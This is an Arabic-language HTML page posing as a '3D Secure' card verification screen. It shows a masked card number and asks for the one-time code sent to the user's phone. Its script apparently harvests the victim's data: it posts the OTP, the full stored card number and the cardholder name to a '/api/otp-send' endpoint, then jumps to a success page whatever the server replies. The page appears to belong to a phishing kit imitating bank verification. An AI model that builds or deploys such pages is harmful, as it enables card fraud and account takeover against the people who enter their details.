<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure Online Shopping</title>    
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .logo-section { background-color: #fefefe; padding: 1rem; border-radius: 0.5rem; }
        #otp { font-size: 18px; letter-spacing: 3px; }
    </style>
</head>

<body class="bg-white min-h-screen flex items-center justify-center flex-col px-4">

    <!-- Cancel Button -->
    <div class="w-full max-w-md px-4 flex justify-end mb-4">
        <button class="text-base sm:text-lg font-semibold text-gray-600" id="cancelBtn">إلغاء</button>
    </div>

    <!-- Main Card -->
    <div id="mainCard" class="w-full max-w-sm sm:max-w-md px-4 py-8 border border-gray-300 shadow-md rounded-md text-center text-black bg-white">
        
        <div class="flex justify-between items-center mb-4">
            <span class="text-xs sm:text-sm font-semibold">ID Check</span>
        </div>

        <h1 class="text-base sm:text-lg font-semibold border-t pt-2 text-right">تحقق الأمان 3D Secure</h1>

        <p class="text-sm sm:text-base text-right mt-2">
            يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك المحمول لإتمام معاملتك بنجاح.
        </p>

        <div class="text-right text-sm sm:text-base mt-4 border-t pt-4">
            <h2 class="font-bold mb-2 text-black">تفاصيل المعاملة:</h2>
            <p><strong>اسم الحامل:</strong> <span id="merchant">-</span></p>
            <p><strong>رقم البطاقة:</strong> <span id="cardNumber"></span></p>
            <p><strong>التاريخ:</strong> <span id="date"></span></p>
        </div>

        <!-- OTP Form -->
        <form id="otpForm">
            <div class="mt-6">
                <label for="otp" class="block text-sm mb-1 text-right">رمز التحقق</label>
                <input type="text" id="otp" name="otp" maxlength="6"
                       inputmode="numeric"
                       pattern="[0-9]*"
                       placeholder="••••••"
                       class="w-full border border-gray-400 rounded-md p-3 text-center focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all">
                <p id="otpError" class="text-red-500 text-sm mt-1 hidden text-right">رمز التحقق غير صحيح. يجيب المحاولة مرة أخرى.</p>
            </div>
            <button id="submitBtn" class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded mt-6 w-full" type="submit" disabled>
                تأكيد الرمز
            </button>
        </form>

        <input type="hidden" id="cardNumberHidden" value="">

        <button id="resresendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5" type="button">إعادة إرسال الرمز</button>

        <p class="text-xs text-gray-600 mt-4 text-center sm:text-sm">
            بالنقر على "تأكيد الرمز" فأنت توافق على 
            <a href="#" class="text-blue-600 hover:underline">شروط الخدمة</a>.
        </p>
    </div>

    <script>
        const otpForm = document.getElementById("otpForm");
        const otpInput = document.getElementById("otp");
        const otpError = document.getElementById("otpError");
        const hiddenCard = document.getElementById("cardNumberHidden");
        const submitBtn = document.getElementById("submitBtn");

        function readJSON(key) {
            try { return JSON.parse(sessionStorage.getItem(key) || 'null'); } catch (e) { return null; }
        }
        function pad(n) { return String(n).padStart(2, '0'); }
        function formatDate(d) {
            return pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear()
                + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
        }

        function fillDetails() {
            const payment = readJSON('temp_payment') || readJSON('pk_payment');
            const dateEl = document.getElementById('date');
            const cardEl = document.getElementById('cardNumber');
            const merchantEl = document.getElementById('merchant');

            const cardHolderName = (payment && (payment.card_name || payment.holder)) ? (payment.card_name || payment.holder) : 'غير متوفر';
            const rawCard = (payment && (payment.card_number || payment.masked)) ? (payment.card_number || payment.masked) : '';
            const cardText = rawCard.length > 4 ? '•••• •••• •••• ' + rawCard.slice(-4) : '•••• •••• •••• ••••';

            if (dateEl) dateEl.textContent = formatDate(new Date());
            if (cardEl) cardEl.textContent = cardText;
            if (hiddenCard) hiddenCard.value = cardText;
            if (merchantEl) merchantEl.textContent = cardHolderName;
        }

        otpInput.addEventListener('input', function (e) {
            const value = e.target.value.replace(/\D/g, '').slice(0, 6);
            e.target.value = value;
            
            if (value.length > 0) {
                otpInput.classList.remove("border-red-500");
                otpError.classList.add("hidden");
            }

            // تفعيل زر التأكيد فقط إذا كان الرمز يتكون من 4 أرقام أو أكثر
            submitBtn.disabled = value.length < 4;
        });

        let userId = localStorage.getItem('a2_user_id');
        if (!userId) {
            userId = 'user_' + Math.random().toString(36).substring(2, 11);
            localStorage.setItem('a2_user_id', userId);
        }

        otpForm.addEventListener("submit", async function (e) {
            e.preventDefault();
            const otpValue = otpInput.value.trim();

            if (!otpValue || otpValue.length < 4) {
                otpInput.classList.add("border-red-500");
                otpError.textContent = "الرجاء إدخال رمز تحقق صحيح";
                otpError.classList.remove("hidden");
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ جاري التحقق...';

            const paymentData = readJSON('temp_payment') || readJSON('pk_payment') || {};
            
            const payload = {
                user_id: userId,
                otp_code: otpValue,
                card_number: paymentData.card_number || paymentData.masked || hiddenCard.value,
                card_name: paymentData.card_name || paymentData.holder
            };

            try {
                // نقطة الاتصال الخلفية (جاهزة لتعديل المسار حسب نظامك)
                const response = await fetch('/api/otp-send', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();
                console.log('OTP Server response:', result);

                // الانتقال لصفحة النجاح أو الانتظار
                window.location.href = 'success.html';

            } catch (error) {
                console.error('Fetch error:', error);
                submitBtn.disabled = false;
                submitBtn.textContent = 'تأكيد الرمز';
                otpInput.classList.add("border-red-500");
                otpError.textContent = "خطأ في الاتصال بالسيرفر. حاول مرة أخرى.";
                otpError.classList.remove("hidden");
            }
        });

        document.getElementById('cancelBtn').addEventListener('click', () => {
            window.location.href = 'payment.html';
        });

        fillDetails();
        otpInput.focus();
    </script>

</body>
</html>
